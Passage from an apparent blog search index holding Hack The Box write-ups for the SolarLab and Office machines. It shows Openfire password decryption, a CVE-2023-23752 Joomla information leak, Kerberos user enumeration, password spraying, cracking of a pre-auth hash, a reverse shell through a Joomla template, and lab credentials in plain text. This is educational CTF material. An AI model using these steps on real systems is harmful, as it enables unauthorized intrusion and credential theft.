values(\u0026#39;cache.mucservice\u0026#39;\u0026#39;conference\u0026#39;\u0026#39;rooms.size\u0026#39;,\u0026#39;-1\u0026#39;,0,null) insert into ofproperty values(\u0026#39;passwordkey\u0026#39;,\u0026#39;hgxifzskaaeyljn\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.admin.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.admin.defaultadminprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.auth.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.auth.defaultauthprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.group.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.group.defaultgroupprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.lockout.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.lockout.defaultlockoutprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.securityaudit.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.security.defaultsecurityauditprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.user.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.user.defaultuserprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.vcard.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.vcard.defaultvcardprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;update.lastcheck\u0026#39;,\u0026#39;1715023572956\u0026#39;,0,null) insert into ofproperty values(\u0026#39;xmpp.auth.anonymous\u0026#39;,\u0026#39;false\u0026#39;,0,null) insert into ofproperty values(\u0026#39;xmpp.domain\u0026#39;,\u0026#39;solarlab.htb\u0026#39;,0,null) insert into ofproperty values(\u0026#39;xmpp.proxy.enabled\u0026#39;,\u0026#39;false\u0026#39;,0,null) insert into ofproperty values(\u0026#39;xmpp.socket.ssl.active\u0026#39;,\u0026#39;true\u0026#39;,0,null) insert into ofversion values(\u0026#39;openfire\u0026#39;,34) insert into ofsecurityauditlog values(1,\u0026#39;admin\u0026#39;,1700223751042,\u0026#39;successful admin console login attempt\u0026#39;,\u0026#39;solarlab.htb\u0026#39;,\u0026#39;the user logged in successfully to the admin console from address 127.0.0.1. \u0026#39;) insert into ofsecurityauditlog values(2,\u0026#39;admin\u0026#39;,1700223756534,\u0026#39;edited file transfer proxy settings\u0026#39;,\u0026#39;solarlab.htb\u0026#39;,\u0026#39;port = 7777\\u000ahardcodedaddress = null\\u000aenabled = false\u0026#39;) insert into ofmucservice values(1,\u0026#39;conference\u0026#39;,null,0) insert into ofpubsubnode values(\u0026#39;pubsub\u0026#39;,\u0026#39;\u0026#39;,0,\u0026#39;001700223743445\u0026#39;,\u0026#39;001700223743445\u0026#39;,null,0,0,0,0,1,1,1,0,0,\u0026#39;publishers\u0026#39;,1,0,\u0026#39;open\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;solarlab.htb\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;english\u0026#39;,\u0026#39;\u0026#39;,null,\u0026#39;all\u0026#39;,-1) insert into ofpubsubaffiliation values(\u0026#39;pubsub\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;solarlab.htb\u0026#39;,\u0026#39;owner\u0026#39;) insert into ofpubsubdefaultconf values(\u0026#39;pubsub\u0026#39;,0,0,0,0,0,1,1,1,0,0,\u0026#39;publishers\u0026#39;,1,\u0026#39;open\u0026#39;,\u0026#39;english\u0026#39;,null,\u0026#39;all\u0026#39;,-1) insert into ofpubsubdefaultconf values(\u0026#39;pubsub\u0026#39;,1,1,10485760,0,1,1,1,1,0,1,\u0026#39;publishers\u0026#39;,1,\u0026#39;open\u0026#39;,\u0026#39;english\u0026#39;,null,\u0026#39;all\u0026#39;,-1) the important parts are:\ninsert into ofuser values(\u0026#39;admin\u0026#39;,\u0026#39;gjmoswpk+hakpdvlivp6elklyh0=\u0026#39;,\u0026#39;9mwnqcj9bf4yeyzddns5gvxp620=\u0026#39;,\u0026#39;yidqk5skw11qjwtbaloab28lyhftqa0x\u0026#39;,4096,null,\u0026#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442\u0026#39;,\u0026#39;administrator\u0026#39;,\u0026#39;admin@solarlab.htb\u0026#39;,\u0026#39;001700223740785\u0026#39;,\u0026#39;0\u0026#39;) insert into ofproperty values(\u0026#39;passwordkey\u0026#39;,\u0026#39;hgxifzskaaeyljn\u0026#39;,0,null) after a lot of struggle found a github repo that can decrypt the password hash if we have the passwordkey.\n$ java openfiredecryptpass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hgxifzskaaeyljn picked up _java_options: -dawt.usesystemaafontsettings=on -dswing.aatext=true *************** (hex: 005400680069007300500061007300730077006f0072006400530068006f0075006c00640044006f00210040) administrator credential\nadministrator:************** using psexec by impacket i was able get a shell as administrator. ** psexec needs a writable share to upload a malicious binary to create a service using the service manager. it then uses this binary for the service\u0026rsquo;s binpath and start the server. so, to get a shell using psexec we need following conditions:\na writeable share to upload a malicious binary proper privilege token assigned to add, start, stop and remove a service. summary i struggled to find a foothold on the box because i didn\u0026rsquo;t test all the parameters to send the exploit. also, after gaining openfire user\u0026rsquo;s shell i also found it difficult to recover the administrator password because i lacked the knowledge of openfire password decryption tool. overall, my recon was good.\n","title":"HTB Machine Solarlab"},{"date":"2024-05-16","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-machines/office/","summary":"Office - HTB Recon Nmap Port State Service Version 53/tcp open domain Simple DNS Plus 80/tcp open http httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28) 88/tcp open kerberos-sec Microsoft Windows Kerberos 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP 443/tcp open ssl/http Apache httpd 2.","tags":["chisel","ctf","CVE-2023-2255","dpapi","htb","kerberos","libreoffice","mimikatz","office","windows"],"text":"office - htb recon nmap port state service version 53/tcp open domain simple dns plus 80/tcp open http httpd 2.4.56 ((win64) openssl/1.1.1t php/8.0.28) 88/tcp open kerberos-sec microsoft windows kerberos 139/tcp open netbios-ssn microsoft windows netbios-ssn 389/tcp open ldap microsoft windows active directory ldap 443/tcp open ssl/http apache httpd 2.4.56 (openssl/1.1.1t php/8.0.28) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http microsoft windows rpc over http 1.0 636/tcp open ssl/ldap microsoft windows active directory ldap 3268/tcp open ldap microsoft windows active directory ldap 3269/tcp open ssl/ldap microsoft windows active directory ldap host script results:\n| smb2-security-mode: | 3:1:1: |_ message signing enabled and required | p2p-conficker: | checking for conficker.c or higher... | check 1 (port 15731/tcp): clean (timeout) | check 2 (port 48612/tcp): clean (timeout) | check 3 (port 52719/udp): clean (timeout) | check 4 (port 54522/udp): clean (timeout) |_ 0/4 checks are positive: host is clean or ports are blocked |_clock-skew: 7h55m29s | smb2-time: | date: 2024-04-28t22:53:10 |_ start_date: n/a i think it will be better if we fix our clock-skew that is almost 8 hours. to do that let\u0026rsquo;s run the following command.\n$ sudo ntpdate -u 10.10.11.3 enumeration http enumeration joomla cms 4.2 - cve-2023-23752\n$ curl http://office.htb/readme.txt joomla! cmsâ¢ 1- overview * this is a joomla! 4.x installation/upgrade package. * joomla! official site: https://www.joomla.org * joomla! 4.2 version history - https://docs.joomla.org/special:mylanguage/joomla_4.2_version_history * detailed changes in the changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev this version is vulnerable to unauthenticated information disclosure (cve-2023-23752) due to improper access check. so we can access some restricted endpoints.\nusers\n$ curl http://office.htb/api/index.php/v1/users?public=true {\u0026#34;links\u0026#34;:{\u0026#34;self\u0026#34;:\u0026#34;http:\\/\\/office.htb\\/api\\/index.php\\/v1\\/users?public=true\u0026#34;},\u0026#34;data\u0026#34;:[{\u0026#34;type\u0026#34;:\u0026#34;users\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;474\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;id\u0026#34;:474,\u0026#34;name\u0026#34;:\u0026#34;tony stark\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;administrator\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;administrator@holography.htb\u0026#34;,\u0026#34;block\u0026#34;:0,\u0026#34;sendemail\u0026#34;:1,\u0026#34;registerdate\u0026#34;:\u0026#34;2023-04-13 23:27:32\u0026#34;,\u0026#34;lastvisitdate\u0026#34;:\u0026#34;2024-04-26 19:43:46\u0026#34;,\u0026#34;lastresettime\u0026#34;:null,\u0026#34;resetcount\u0026#34;:0,\u0026#34;group_count\u0026#34;:1,\u0026#34;group_names\u0026#34;:\u0026#34;super users\u0026#34;}}],\u0026#34;meta\u0026#34;:{\u0026#34;total-pages\u0026#34;:1}} application config\n$ curl http://office.htb/api/index.php/v1/config/application?public=true {\u0026#34;links\u0026#34;:{\u0026#34;self\u0026#34;:\u0026#34;http:\\/\\/office.htb\\/api\\/index.php\\/v1\\/config\\/application?public=true\u0026#34;,\u0026#34;next\u0026#34;:\u0026#34;http:\\/\\/office.htb\\/api\\/index.php\\/v1\\/config\\/application?public=true\u0026amp;page%5boffset%5d=20\u0026amp;page%5blimit%5d=20\u0026#34;,\u0026#34;last\u0026#34;:\u0026#34;http:\\/\\/office.htb\\/api\\/index.php\\/v1\\/config\\/application?public=true\u0026amp;page%5boffset%5d=60\u0026amp;page%5blimit%5d=20\u0026#34;},\u0026#34;data\u0026#34;:[{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;offline\u0026#34;:false,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;offline_message\u0026#34;:\u0026#34;this site is down for maintenance.\u0026lt;br\u0026gt;please check back again soon.\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;display_offline_message\u0026#34;:1,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;offline_image\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;sitename\u0026#34;:\u0026#34;holography industries\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;editor\u0026#34;:\u0026#34;tinymce\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;captcha\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;list_limit\u0026#34;:20,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;access\u0026#34;:1,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;debug\u0026#34;:false,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;debug_lang\u0026#34;:false,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;debug_lang_const\u0026#34;:true,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;dbtype\u0026#34;:\u0026#34;mysqli\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;host\u0026#34;:\u0026#34;localhost\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;user\u0026#34;:\u0026#34;root\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;password\u0026#34;:\u0026#34;h0lograms4retaking0ver754!\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;db\u0026#34;:\u0026#34;joomla_db\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;dbprefix\u0026#34;:\u0026#34;if2tx_\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;dbencryption\u0026#34;:0,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;dbsslverifyservercert\u0026#34;:false,\u0026#34;id\u0026#34;:224}}],\u0026#34;meta\u0026#34;:{\u0026#34;total-pages\u0026#34;:4}} credentials\nroot:h0lograms4retaking0ver754! at a first glance it looks like a credential for the database of the joomla service. i tried to login using the cred to joomla admin panel no luck there.\nad enumeration using the above credential i tried to login using smb, ldap no luck there too. because i only possesed one username administrator, having only this will not help. i had a password so i can try password spraying attack on the ad but i needed some valid usernames.\nbecause kerberos is enabled on the machine it can help us to gather usernames. because by default i think kerberos authentication on ad returns a unique error for usernames that don\u0026rsquo;t exist.\nuser enumeration (kerberos)\nusing kerbrute by ropnop i tested a list of users against kerberos and tried to find some valid usernames.\n$ kerbrute userenum --dc dc.office.htb -d office.htb ~/seclists/usernames/xato-net-10-million-usernames.txt -o kerbrute.log __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ version: dev (n/a) - 04/28/24 - ronnie flathers @ropnop 2024/04/28 13:08:53 \u0026gt; using kdc(s): 2024/04/28 13:08:53 \u0026gt; dc.office.htb:88 2024/04/28 13:09:30 \u0026gt; [+] valid username:\tadministrator@office.htb 2024/04/28 13:12:34 \u0026gt; [+] valid username:\tadministrator@office.htb 2024/04/28 13:13:57 \u0026gt; [+] valid username:\tewhite@office.htb 2024/04/28 13:13:57 \u0026gt; [+] valid username:\tetower@office.htb 2024/04/28 13:13:58 \u0026gt; [+] valid username:\tdwolfe@office.htb 2024/04/28 13:13:59 \u0026gt; [+] valid username:\tdlanor@office.htb 2024/04/28 13:13:59 \u0026gt; [+] valid username:\tdmichael@office.htb 2024/04/28 13:54:19 \u0026gt; [+] valid username:\thhogan@office.htb now let\u0026rsquo;s try netexec to spray the password using these usernames.\n$ nxc ldap dc.office.htb -u ad_users.txt -p \u0026#39;h0lograms4retaking0ver754!\u0026#39; ldap 10.10.11.3 389 dc.office.htb [-] error retrieving os arch of 10.10.11.3: could not connect: timed out smb 10.10.11.3 445 dc [*] windows server 2022 build 20348 (name:dc) (domain:office.htb) (signing:true) (smbv1:false) ldap 10.10.11.3 389 dc [-] office.htb\\administrator:h0lograms4retaking0ver754! ldap 10.10.11.3 389 dc [-] office.htb\\administrator:h0lograms4retaking0ver754! ldap 10.10.11.3 389 dc [-] office.htb\\ewhite:h0lograms4retaking0ver754! ldap 10.10.11.3 389 dc [-] office.htb\\etower:h0lograms4retaking0ver754! ldaps 10.10.11.3 636 dc [+] office.htb\\dwolfe:h0lograms4retaking0ver754! looks like i got a match for the user dwolfe. let\u0026rsquo;s enumerate his shares.\nsmb enumeration\n$ nxc smb dc.office.htb -u \u0026#39;dwolfe\u0026#39; -p \u0026#39;h0lograms4retaking0ver754!\u0026#39; --shares smb 10.10.11.3 445 dc [*] windows server 2022 build 20348 (name:dc) (domain:office.htb) (signing:true) (smbv1:false) smb 10.10.11.3 445 dc [+] office.htb\\dwolfe:h0lograms4retaking0ver754! smb 10.10.11.3 445 dc [*] enumerated shares smb 10.10.11.3 445 dc share permissions remark smb 10.10.11.3 445 dc ----- ----------- ------ smb 10.10.11.3 445 dc admin$ remote admin smb 10.10.11.3 445 dc c$ default share smb 10.10.11.3 445 dc ipc$ read remote ipc smb 10.10.11.3 445 dc netlogon read logon server share smb 10.10.11.3 445 dc soc analysis read smb 10.10.11.3 445 dc sysvol read logon server share i found an unusual share named soc analysis let\u0026rsquo;s dump it using smbclient.\n$ smbclient \u0026#39;\\\\10.10.11.3\\soc analysis\u0026#39; -u dwolfe -l password for [workgroup\\dwolfe]: try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . d 0 wed may 10 13:52:24 2023 .. dhs 0 wed feb 14 04:18:31 2024 latest-system-dump-8fbc124d.pcap a 1372860 sun may 7 19:59:00 2023 6265599 blocks of size 4096. 1193500 blocks available smb: \\\u0026gt; get latest-system-dump-8fbc124d.pcap getting file \\latest-system-dump-8fbc124d.pcap of size 1372860 as latest-system-dump-8fbc124d.pcap (387.6 kilobytes/sec) (average 387.6 kilobytes/sec) smb: \\\u0026gt; exit let\u0026rsquo;s analyze the pcap file using wireshark.\npcap analysis\nasreqroast - cracking pre-auth timestamp\nafter analyzing the pcap file i found two as-req. in a typical kerberos setup the the pre-auth feature is enabled by default. if it is enabled we cannot perform asreproast attack. but it opens another vector for an attack. in kerberos when pre-auth is enabled the client encrypts the current timestamp with it\u0026rsquo;s own password as an encryption key. so, if the password is weak enough we can obtain it using hashcat by trying to decrypt the cipher which is shown in the figure. here the etype is 18. so the mode for hashcat would be 19900. which depicts pre-auth in hashcat\u0026rsquo;s documentation.\nalso i discovered the cname object contained cname-string: tstark this is the user sending the request. so the user is tstark@office.htb. now let\u0026rsquo;s construct the hash for hashcat.\nhashcat\nhash\n$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc cracked\n$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69 foothold i tried the cracked password against the ad but didn\u0026rsquo;t work. but it worked against joomla admin dashboard. let\u0026rsquo;s try to get a reverse shell on joomla dashboard using templates. i got a shell of the web_account user.\nc:\\xampp\\htdocs\\joomla\\templates\\cassiopeia\u0026gt;whoami office\\web_account c:\\xampp\\htdocs\\joomla\\templates\\cassiopeia\u0026gt; the htdocs folder contained anothe directory named internal besides joomla.\nc:\\xampp\\htdocs\u0026gt;dir volume in drive c has no label. volume serial number is c626-9388 directory of c:\\xampp\\htdocs 05/09/2023 07:53 am \u0026lt;dir\u0026gt; . 01/24/2024 05:08 am \u0026lt;dir\u0026gt; .. 05/09/2023 07:53 am \u0026lt;dir\u0026gt; administrator 01/30/2024 09:39 am \u0026lt;dir\u0026gt; internal 04/30/2024 07:15 am \u0026lt;dir\u0026gt; joomla 0 file(s) 0 bytes 5 dir(s) 5,044,477,952 bytes free c:\\xampp\\htdocs\u0026gt; one file seemed interesting inside the internal directory. it was resume.php.\nc:\\xampp\\htdocs\\internal\u0026gt;dir volume in drive c has no label. volume serial number is c626-9388 directory of c:\\xampp\\htdocs\\internal 01/30/2024 09:39 am \u0026lt;dir\u0026gt; . 05/09/2023 07:53 am \u0026lt;dir\u0026gt; .. 02/14/2024 06:35 pm \u0026lt;dir\u0026gt; applications 05/01/2023 04:27 pm \u0026lt;dir\u0026gt; css 05/01/2023 04:27 pm \u0026lt;dir\u0026gt; img 01/30/2024 09:38 am 5,113 index.html 01/30/2024 09:40 am 5,282 resume.php 2 file(s) 10,395 bytes 5 dir(s) 5,038,227,456 bytes free resume.php\n\u0026lt;?php $notifi = \u0026#34;\u0026#34;; if($_server[\u0026#34;request_method\u0026#34;] == \u0026#34;post\u0026#34; ){ $stdname=trim($_post[\u0026#39;fullname\u0026#39;]); $email=str_replace(\u0026#39;.\u0026#39;,\u0026#39;-\u0026#39;,$_post[\u0026#39;email\u0026#39;]); $experience=trim($_post[\u0026#39;experience\u0026#39;]); $salary=trim($_post[\u0026#39;salary\u0026#39;]); $department=trim($_post[\u0026#39;department\u0026#39;]); $rewritefn = strtolower(str_replace(\u0026#39; \u0026#39;,\u0026#39;-\u0026#39;,\u0026#34;$stdname-$department-$salary $experience $email\u0026#34;)); $filename =$_files[\u0026#39;assignment\u0026#39;][\u0026#39;name\u0026#39;]; $filetype= $_files[\u0026#39;assignment\u0026#39;][\u0026#39;type\u0026#39;]; $filesize =$_files[\u0026#39;assignment\u0026#39;][\u0026#39;size\u0026#39;]; $fileerr = $_files[\u0026#39;assignment\u0026#39;][\u0026#39;error\u0026#39;]; $filetmp = $_files[\u0026#39;assignment\u0026#39;][\u0026#39;tmp_name\u0026#39;]; chmod($_files[\u0026#39;assignment\u0026#39;][\u0026#39;tmp_name\u0026#39;], 0664); // onigiri in . $ext = explode(\u0026#39;.\u0026#39;,$filename); //last piece of data from array $extension = strtolower(end($ext)); $filesallowed = array(\u0026#39;docm\u0026#39;,\u0026#39;docx\u0026#39;,\u0026#39;doc\u0026#39;,\u0026#39;odt\u0026#39;); if(in_array($extension,$filesallowed)){ if ($fileerr === 0){ if ($filesize \u0026lt; 5242880){ $ff = \u0026#34;$rewritefn.$extension\u0026#34;; $loc = \u0026#34;applications/\u0026#34;.$ff; if(move_uploaded_file($filetmp,$loc)) { // upload successful $notifi=\u0026#34;\u0026lt;span class=notifi\u0026gt;â upload successful!\u0026lt;/span\u0026gt;\u0026lt;hr/\u0026gt;\u0026lt;style\u0026gt; button, input , select, option, h3{ display:none; } \u0026lt;/style\u0026gt;\u0026#34;; } else { echo $loc; $notifi=\u0026#34;\u0026lt;span class=notifi\u0026gt;âï¸ something went wrong! unable to upload the resume!\u0026lt;/span\u0026gt;\u0026lt;hr/\u0026gt;\u0026#34;; } } else { $notifi=\u0026#34;\u0026lt;span class=notifi\u0026gt;â ï¸ your resume should be less than 5mb!\u0026lt;/span\u0026gt;\u0026lt;hr/\u0026gt;\u0026#34;; } } else { $notifi=\u0026#34;\u0026lt;span class=notifi\u0026gt;âï¸ corrupted file/unable to upload!\u0026lt;/span\u0026gt;\u0026lt;hr/\u0026gt;\u0026#34;; } } else { $notifi=\u0026#34;\u0026lt;span class=notifi\u0026gt;â accepted file types : doc, docx, docm, odt!\u0026lt;/span\u0026gt;\u0026lt;hr/\u0026gt;\u0026#34;; } } ?\u0026gt; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;https://www.pinclipart.com/picdir/big/344-3445944_png-file-svg-terminal-icon-png-clipart.png\u0026#34;\u0026gt; \u0026lt;title\u0026gt;resume submission\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; body{ height:100%; overflow:auto; } .notifi{ font-weight:bold; padding:0px; } .notifi hr{ background:#000000; height:2px; } .magic{ margin-top:0.5%; max-height:90%; max-width:90%; border: 2px solid #000000; } .inpstylef{ border-bottom: 2px solid #000000; padding:0.5%; font-size:14px; font-weight:bold; } .inputstyle ,.inpstyles { width:69%; height:35px; border:2px solid #000000; } .inpstylef::-webkit-file-upload-button { visibility: hidden; } .inpstylef::before { content: \u0026#39; ï®\u0026#39;; display: inline-block; border: 1px solid #999; border-radius: 3px; padding: 5px 8px; outline: none; white-space: nowrap; -webkit-user-select: none; cursor: pointer; text-shadow: 1px 1px #fff; font-weight: 700; font-size: 10pt; } ::placeholder{ color:#151715; opacity:1; font-weight:bold; } .magic h3{ text-align: left; padding-left: 260px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt; \u0026lt;div class=\u0026#34;magic\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;ï job application submission\u0026lt;/h1\u0026gt; \u0026lt;hr style=\u0026#34;width:inherit;padding:0px;height:2px; background:#000000\u0026#34;/\u0026gt; \u0026lt;span class=\u0026#34;notifi\u0026#34;\u0026gt;\u0026lt;?php echo \u0026#34;$notifi\u0026#34;; ?\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;full name:\u0026lt;/h3\u0026gt; \u0026lt;input class=\u0026#34;inputstyle\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;fullname\u0026#34; placeholder=\u0026#34;example : john doe\u0026#34; required\u0026gt; \u0026lt;h3\u0026gt;email:\u0026lt;/h3\u0026gt; \u0026lt;input class=\u0026#34;inputstyle\u0026#34; type=\u0026#34;email\u0026#34; name=\u0026#34;email\u0026#34; placeholder=\u0026#34; example : xxx123@xyz.abc\u0026#34; required\u0026gt; \u0026lt;h3\u0026gt;work experience\u0026lt;/h3\u0026gt; \u0026lt;select id=\u0026#34;\u0026#34; style=\u0026#34;background:#151715; color:#ffffff; font-weight:bold\u0026#34; class=\u0026#34;inpstyles\u0026#34; name=\u0026#34;experience\u0026#34; required\u0026gt; \u0026lt;option class=\u0026#34;inpstyl\u0026#34;\u0026gt;0-5 years\u0026lt;/option\u0026gt; \u0026lt;option class=\u0026#34;inpstyl\u0026#34;\u0026gt;10-20 years\u0026lt;/option\u0026gt; \u0026lt;option class=\u0026#34;inpstyl\u0026#34;\u0026gt;20-30 years\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;h3\u0026gt;requested salary\u0026lt;/h3\u0026gt; \u0026lt;select id=\u0026#34;\u0026#34; class=\u0026#34;inpstyles\u0026#34; style=\u0026#34;background:#151715; color:#ffffff; font-weight:bold\u0026#34; name=\u0026#34;salary\u0026#34; required\u0026gt; \u0026lt;option value=\u0026#34;30 000\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;30 000$\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;60 000\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;60 000$\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;80 000\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;80 000$\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;100 000\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;100 000$\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;200 000\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;200 000$\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;300 000\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;300 000$\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt;\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;h3\u0026gt;choose your department\u0026lt;/h3\u0026gt; \u0026lt;select id=\u0026#34;\u0026#34; class=\u0026#34;inpstyles\u0026#34;style=\u0026#34;background:#151715; color:#ffffff; font-weight:bold\u0026#34; name=\u0026#34;department\u0026#34; required\u0026gt; \u0026lt;option value=\u0026#34;it\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;it\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;sales\u0026#34; 